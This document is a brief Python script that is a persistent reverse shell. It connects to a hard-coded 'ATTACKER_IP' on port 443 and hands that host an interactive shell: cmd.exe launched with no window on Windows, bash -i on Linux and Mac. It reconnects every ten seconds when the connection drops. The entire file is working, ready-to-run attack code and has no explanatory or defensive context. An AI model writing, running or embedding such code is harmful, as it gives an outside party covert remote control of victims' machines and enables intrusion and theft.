import socket
import os
import sys
import subprocess
import time

ATTACKER_IP = "192.168.1.77"
PORT = 443

def persistent_shell():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.connect((ATTACKER_IP, PORT))
            
            if sys.platform == "win32":
                # Windows stable shell
                subprocess.Popen(
                    ["cmd.exe"],
                    stdin=s.fileno(),
                    stdout=s.fileno(),
                    stderr=s.fileno(),
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
            else:
                # Linux/Mac PTY allocation
                os.dup2(s.fileno(), 0)
                os.dup2(s.fileno(), 1)
                os.dup2(s.fileno(), 2)
                subprocess.call(["/bin/bash", "-i"])
            
            # Keep connection alive
            while True:
                if s.recv(1) == b'': break
                time.sleep(1)
                
        except Exception as e:
            time.sleep(10)  # Retry every 10 seconds
            continue

persistent_shell()
